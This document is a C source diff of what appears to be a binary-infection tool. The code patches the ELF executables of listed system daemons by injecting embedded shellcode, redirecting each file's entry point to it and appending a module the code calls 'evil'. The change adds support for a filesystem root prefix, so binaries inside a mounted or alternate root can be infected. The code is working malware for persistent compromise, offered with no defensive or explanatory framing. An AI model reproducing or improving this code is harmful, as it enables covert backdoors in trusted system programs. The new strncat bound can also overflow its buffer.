@@ -65,6 +65,7 @@ int get_file_size(int fd)
 
 
 void install_module_by_path(char *path,
+                            char *relative_path,
                             const char module_start[],
                             const char module_end[])
 {
@@ -115,17 +116,18 @@ void install_module_by_path(char *path,
 
     unsigned long patch_base, patch_virtual_base;
     unsigned long patch_size = _binary_shellcode_bin_end -
-                               _binary_shellcode_bin_start + strlen(path) + 1;
+                               _binary_shellcode_bin_start +
+                               strlen(relative_path) + 1;
     if (find_valid_section(image, patch_size, &patch_base,
                            &patch_virtual_base)) {
         puts(WARN "No avalible space for patching");
         goto out;
     }
-    char *shellcode = malloc(patch_size - strlen(path) - 1);
+    char *shellcode = malloc(patch_size - strlen(relative_path) - 1);
     if (!shellcode)
         goto out;
     memmove(shellcode, _binary_shellcode_bin_start,
-            patch_size - strlen(path) - 1);
+            patch_size - strlen(relative_path) - 1);
     Elf64_Ehdr *elf_header = (Elf64_Ehdr *) image;
     *(unsigned long *) (shellcode + 2) =
         patch_virtual_base - elf_header->e_entry;
@@ -133,9 +135,10 @@ void install_module_by_path(char *path,
     *(unsigned long *) (shellcode + 18) = evil_size;
     elf_header->e_entry = patch_virtual_base;
 
-    memmove(image + patch_base, shellcode, patch_size - strlen(path) - 1);
-    memmove(image + patch_base + patch_size - strlen(path) - 1, path,
-            strlen(path) + 1);
+    memmove(image + patch_base, shellcode,
+            patch_size - strlen(relative_path) - 1);
+    memmove(image + patch_base + patch_size - strlen(relative_path) - 1,
+            relative_path, strlen(relative_path) + 1);
     memmove(image + evil_base, module_start, evil_size);
     free(shellcode);
     shellcode = NULL;
@@ -148,9 +151,18 @@ out:
     return;
 }
 
-void install_module(const char module_start[], const char module_end[])
+static char path_buf[4097];
+
+void install_module(const char module_start[],
+                    const char module_end[],
+                    const char *root)
 {
     for (int i = 0; i < ARRAY_SIZE(sys_daemons); i++) {
-        install_module_by_path(sys_daemons[i], module_start, module_end);
+        strncpy(path_buf, root, 4096);
+        strncat(path_buf, sys_daemons[i], 4096);
+        path_buf[4096] = 0;
+        printf("%s\n", path_buf);
+        install_module_by_path(path_buf, sys_daemons[i], module_start,
+                               module_end);
     }
 }
